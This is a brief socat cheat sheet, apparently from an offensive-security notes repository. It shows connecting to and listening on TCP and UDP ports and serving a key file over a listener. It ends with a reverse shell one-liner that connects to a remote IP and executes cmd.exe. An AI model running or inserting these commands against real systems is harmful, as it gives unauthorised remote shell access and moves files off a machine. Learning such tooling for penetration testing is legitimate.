# Socat

* ***Connect to tcp/udp***

```shell
socat - TCP4:10.10.10.10:80
```
<img width="557" alt="Screen Shot 2021-12-04 at 14 20 20" src="https://user-images.githubusercontent.com/92652606/144711022-1eb74d18-7ae9-4984-8d1a-a29d850142e8.png">

```shell
socat - UDP:10.0.0.0:53 
```
* ***Listening on a tcp/udp***

```shell
socat TCP4-LISTEN:1337 STDOUT
```

```shell
socat UDP-LISTEN:1337 STDOUT
```

* ***File Transfer***

```shell 
socat TCP4-LISTEN:1337,fork file:~/home/mastermind/key.txt # the file we will send 
```
```shell
socat - TCP4:0.0.0.0:1337 # TO download the file 
```
<img width="1038" alt="Screen Shot 2021-12-04 at 14 30 15" src="https://user-images.githubusercontent.com/92652606/144711309-69a659bf-52f3-41b4-9813-1016ca2d1051.png">

* ***Reverse Shell***

```shell
socat -d -d TCP4-LISTEN:1337 STDOUT # A LISTENER 
```
<img width="1081" alt="Screen Shot 2021-12-04 at 14 37 21" src="https://user-images.githubusercontent.com/92652606/144711609-e9fbe69c-25c2-4463-b0ac-9bf295bf316b.png">

```shell
socat - TCP4:192.168.1.107:1337 EXEC:cmd.exe
```
![screen](https://user-images.githubusercontent.com/92652606/144711614-8cb7efd5-d811-496a-aca0-1e334362ae33.png)

